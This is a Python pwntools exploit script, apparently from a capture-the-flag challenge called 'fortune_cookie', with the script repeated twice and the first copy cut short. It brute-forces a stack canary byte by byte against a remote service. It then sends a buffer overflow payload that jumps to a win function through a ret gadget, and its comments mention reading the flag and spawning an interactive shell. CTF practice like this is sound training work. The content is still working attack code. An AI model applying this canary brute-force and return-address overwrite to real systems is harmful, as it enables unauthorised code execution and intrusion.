#!/usr/bin/env python3
from pwn import *
import time

HOST, PORT = 'offsec.m0lecon.it', 13547

#python3 -c "from pwn import *; print(cyclic(100)) as input + debug tofind canary offset
OFFSET_TO_CANARY = 72
#rip offset is canary offset + canary (8B) + saved RPB (8B)
OFFSET_TO_RIP = 88

elf = ELF('./fortune_cookie', checksec=False)

#lab code to brute force canary
known = b"\x00"

for i in range(7):
    for bval in range(256):
        guess = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess

        io = remote(HOST, PORT, level='error')
        io.recvuntil(b"wish\n")
        io.send(payload)
        try:
            data = io.recv(timeout=0.2)
        except EOFError:
            data = b""
        io.close()

        if b"OK" in data:
            known = guess
            log.success(f"byte {i+1}: {bval:02x}")
            break

canary = u64(known)
log.info(f"Canary: {canary:#x}")

io = remote(HOST, PORT)
io.recvuntil(b"wish\n")

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(0x000000000040101a),    # ret gadget for alignment
    p64(elf.sym.win),
)

#this went to eof immediately. I opened a new connection using the same canary and had time for one command (cat ./home/user/flag)
io.send(payload)
#!/usr/bin/env python3
from pwn import *
import time

HOST, PORT = 'offsec.m0lecon.it', 13547

#python3 -c "from pwn import *; print(cyclic(100)) as input + debug tofind canary offset
OFFSET_TO_CANARY = 72
#rip offset is canary offset + canary (8B) + saved RPB (8B)
OFFSET_TO_RIP = 88

elf = ELF('./fortune_cookie', checksec=False)

#lab code to brute force canary
known = b"\x00"

for i in range(7):
    for bval in range(256):
        guess = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess

        io = remote(HOST, PORT, level='error')
        io.recvuntil(b"wish\n")
        io.send(payload)
        try:
            data = io.recv(timeout=0.2)
        except EOFError:
            data = b""
        io.close()

        if b"OK" in data:
            known = guess
            log.success(f"byte {i+1}: {bval:02x}")
            break

canary = u64(known)
log.info(f"Canary: {canary:#x}")

io = remote(HOST, PORT)
io.recvuntil(b"wish\n")

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(0x000000000040101a),    # ret gadget for alignment
    p64(elf.sym.win),
)

#this went to eof immediately. I opened a new connection using the same canary and had time for one command (cat ./home/user/flag)
io.send(payload)
#alternatively so that the shell does not close immediately
#io.sendline(b"/bin/sh -i")
io.interactive()
